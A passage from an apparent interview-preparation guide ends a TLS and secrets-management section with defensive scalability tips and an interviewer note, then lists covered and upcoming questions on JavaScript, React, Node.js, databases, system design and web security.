#### Scalability Considerations

- Centralize TLS termination and cert renewal (ACM auto-renew, cert-manager in Kubernetes) so hundreds of services don't each manage certs — expiry is a top cause of outages
- A service mesh (Istio/Linkerd) automates mTLS issuance/rotation across all services — the org-scale answer to "encrypt and authenticate every internal hop" without per-team effort
- Secrets rotation must be zero-downtime at scale: apps re-read on a schedule or via a notification, so rotating a DB password doesn't require redeploying every consumer simultaneously

> **Interviewer Note:** Knowing HTTPS-plus-HSTS and "don't commit secrets" is Senior baseline. Explaining what TLS does *not* protect, the edge-vs-mTLS termination trade-off, HSTS preload as a one-way door, the frontend-has-no-secrets rule, and rotate-before-scrub — through a leaked-key incident — is Staff/Principal signal.

---

## Upcoming Questions

### JavaScript

| # | Topic |
|---|---|
| Q5 | Memory Management — GC algorithms, mark-and-sweep, common leak patterns |
| Q6 | Async/Await — desugaring, error handling, parallel vs sequential, cancellation |
| Q7 | Promise Internals — states, chaining, allSettled, race, any, custom Promise |
| Q8 | Debounce vs Throttle — implementations, use cases, leading/trailing edge, React integration |
| Q9 | Event Delegation — bubbling, capturing, stopPropagation, real-world patterns |

### React.js

| # | Topic |
|---|---|
| Q10 | Virtual DOM |
| Q11 | Reconciliation |
| Q12 | Fiber Architecture |
| Q13 | Hooks |
| Q14 | Context API |
| Q15 | Redux / RTK |
| Q16 | Performance |
| Q17 | Code Splitting |
| Q18 | Error Boundaries |

### Next.js

- SSR / SSG / ISR / CSR
- App Router
- Server Components

### Node.js

**Covered:** Architecture & Scaling (Q19) · Middleware (Q20) · Routing (Q21) · CORS (Q22) · Security (Q23)

Still upcoming:
- Streams (Readable/Writable/Duplex/Transform, backpressure)
- Memory Leaks (heap snapshots, common leak patterns, `--inspect`)
- Deep dive: Cluster vs. PM2 vs. Kubernetes horizontal scaling in practice

### Express / MongoDB

- Indexing
- Aggregation
- Sharding
- Mongoose Schema Design & Transactions

### System Design

- URL Shortener
- Chat Application
- Notifications
- Micro Frontends

### AWS / Security / Patterns

**Covered:** Production Deployment Architecture (Q24) · Caching Strategy (Q25) · Observability (Q26) · Resilience Patterns (Q27)

### Web & Application Security

**Covered:** Node/API Injection & JWT (Q23) · XSS (Q28) · CSRF & SameSite (Q29) · Auth: Sessions vs JWT / OAuth (Q30) · Authorization: RBAC/ABAC & IDOR (Q31) · TLS/HSTS & Secrets (Q32)

Still upcoming:
- EC2 / S3 / CloudFront specifics
- Design Patterns
- Leadership
